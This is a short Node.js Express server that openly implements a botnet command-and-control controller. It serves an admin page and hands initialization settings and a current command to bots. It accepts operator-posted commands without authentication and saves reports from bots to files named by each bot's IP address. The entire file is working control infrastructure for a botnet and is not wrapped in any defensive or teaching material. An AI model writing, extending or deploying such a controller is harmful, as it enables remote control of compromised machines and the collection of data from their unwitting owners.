/******************************************************************************
* DEPENDENCIES
******************************************************************************/
var express    = require('express');
var argv       = require('yargs').argv;
var bodyParser = require('body-parser');
var fs         = require('fs-extra');
var jsonFile   = require('jsonfile');
var path       = require('path');
var winston    = require('winston');


/******************************************************************************
* APP SETUP
******************************************************************************/
var app = express();
app.use('/bower_components', express.static(path.join(__dirname, 'bower_components')));
app.use('/assets', express.static(path.join(__dirname, 'assets')));
app.use(bodyParser.json());


/******************************************************************************
* OPTIONS
******************************************************************************/

const port = argv.port || 3000;

const reportFilePattern = argv.report || 'data/report/report.${botIp}.json';

winston.level = (argv.verbose) ? 'verbose' : 'info';

/******************************************************************************
 * DATA
 ******************************************************************************/
var INITIALIZATION = {'auth.user-agent': 'MyAwesomeBot', 'sleep': null};

var COMMAND = {'timestamp': Date.now(), 'command': 'NONE'};


/******************************************************************************
* HANDLERS
******************************************************************************/
function fnLandingPage(req, res) {
  res.sendFile(path.join(__dirname + '/views/landing.html'));
}

function fnAdminPage(req, res) {
  res.sendFile(path.join(__dirname + '/views/botnet.html'));
}

function fnGetInitialization(req, res) {
	res.json(INITIALIZATION);
}

function fnSubmitInitialization(req, res) {
  INITIALIZATION = req.body;
  winston.info('New initialization submitted: ', JSON.stringify(INITIALIZATION));
  res.send('Initialization submitted');
}

function fnGetCommand(req, res) {
  res.json(COMMAND);
}

function fnSubmitCommand(req, res) {
  COMMAND = req.body;
  winston.info('New command submitted: ', JSON.stringify(COMMAND));
  res.send('Command submitted');
}

function fnReport(req, res) {
	var report = req.body;
  var bip    = req.ip;
  var file   = reportFilePattern.replace(/\$\{botIp\}/, bip);
  winston.info('Received report from %s: %s', bip, JSON.stringify(report));
  fs.outputJson(file, report, function(err) {
    if(err) {
      winston.info(err);
    } else {
      winston.info('Report saved in %s', file);
    }
  });
	res.send('Report saved')
}


/******************************************************************************
* REST API
******************************************************************************/
app.get('/', fnLandingPage);

app.get('/admin', fnAdminPage);

app.get('/init', fnGetInitialization);

app.post('/init', fnSubmitInitialization);

app.get('/command', fnGetCommand);

app.post('/command', fnSubmitCommand);

app.post('/report', fnReport);


/******************************************************************************
* START
******************************************************************************/
app.listen(port, function () {
  winston.info('Botnet controller ready on port %d', port)
});
